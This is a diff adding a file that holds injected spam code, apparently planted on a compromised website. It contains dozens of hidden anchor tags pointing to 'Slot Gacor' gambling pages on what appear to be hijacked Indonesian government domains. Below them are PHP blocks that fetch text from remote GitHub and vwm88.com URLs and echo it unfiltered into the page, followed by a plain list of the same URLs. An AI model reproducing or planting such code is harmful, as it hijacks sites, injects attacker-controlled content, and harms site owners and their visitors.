@@ -1,0 +1,56 @@
+﻿<a style="display:none"href="https://demokipiv2.perpusnas.go.id/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="https://ptgmi.or.id/admin/info/">Slot Gacor</a>
+<a style="display:none"href="https://ptgmi.or.id/log/">Slot Gacor</a>
+<a style="display:none"href="https://dinsos.jogjaprov.go.id/forums/">Slot Gacor</a>
+<a style="display:none"href="https://dinsos.jogjaprov.go.id/register/">Slot Gacor</a>
+<a style="display:none"href="https://lembatakab.go.id/js/">Slot Gacor</a>
+<a style="display:none"href="https://www.diskominfo.lembatakab.go.id/css/">Slot Gacor</a>
+<a style="display:none"href="https://kin.perpusnas.go.id/daftar-slot-online/">Slot Gacor</a>
+<a style="display:none"href="https://kin.perpusnas.go.id/daftar-slot/">Slot Gacor</a>
+<a style="display:none"href="https://kin.perpusnas.go.id/obj/">Slot Gacor</a>
+<a style="display:none"href="https://bni.perpusnas.go.id/daftar-slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="https://bni.perpusnas.go.id/slot-online/">Slot Gacor</a>
+<a style="display:none"href="http://ptsp.halal.go.id/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="http://ptsp.halal.go.id/daftar-slot/">Slot Gacor</a>
+<a style="display:none"href="http://ptsp.halal.go.id/js/">Slot Gacor</a>
+<a style="display:none"href="http://pintar.jatengprov.go.id/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="http://pintar.jatengprov.go.id/slot-judi/">Slot Gacor</a>
+<a style="display:none"href="http://pintar.jatengprov.go.id/slot88/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="http://tnmanusela.menlhk.go.id/daftar/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="https://elapor.merauke.go.id/slot/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="https://elapor.merauke.go.id/slot-online/">Slot Gacor</a>
+<a style="display:none"href="https://binamentals.jogjaprov.go.id/public/home/">Slot Gacor</a>
+<a style="display:none"href="https://diskopukm.jogjaprov.go.id/files/slot-gacor/">Slot Gacor</a>
+<a style="display:none"href="https://erecruitment.puninar.com/upload_file/">Slot Gacor</a>
+<a style="display:none"href="https://injury-odpc2.moph.go.th/slot-gacor/">Slot Gacor</a>
+
+
+<?php $a = file_get_contents('https://raw.githubusercontent.com/SilenceIsGold88/Index/main/PrivateContent.txt');
+echo $a; ?>
+<?php echo file_get_contents("https://vwm88.com/Backlink2.txt"); ?>
+
+<?php 
+$a = file_get_contents('https://raw.githubusercontent.com/echourl/php/main/file.txt');
+echo $a;
+	include "conn.php";
+?>
+
+https://demokipiv2.perpusnas.go.id/slot-gacor/
+https://ptgmi.or.id/admin/info/
+https://ptgmi.or.id/log
+https://dinsos.jogjaprov.go.id/forums/
+https://dinsos.jogjaprov.go.id/register/
+https://kin.perpusnas.go.id/daftar-slot-online/
+https://kin.perpusnas.go.id/daftar-slot/
+https://bni.perpusnas.go.id/daftar-slot-gacor/
+https://bni.perpusnas.go.id/slot-online/
+http://ptsp.halal.go.id/slot-gacor/
+http://ptsp.halal.go.id/daftar-slot/
+http://pintar.jatengprov.go.id/slot-gacor/
+http://pintar.jatengprov.go.id/slot-judi/
+http://pintar.jatengprov.go.id/slot88/slot-gacor/
+http://tnmanusela.menlhk.go.id/daftar/slot-gacor/
+https://elapor.merauke.go.id/slot/slot-gacor/
+https://elapor.merauke.go.id/slot-online/
+https://binamentals.jogjaprov.go.id/public/home/
+https://diskopukm.jogjaprov.go.id/files/slot-gacor/
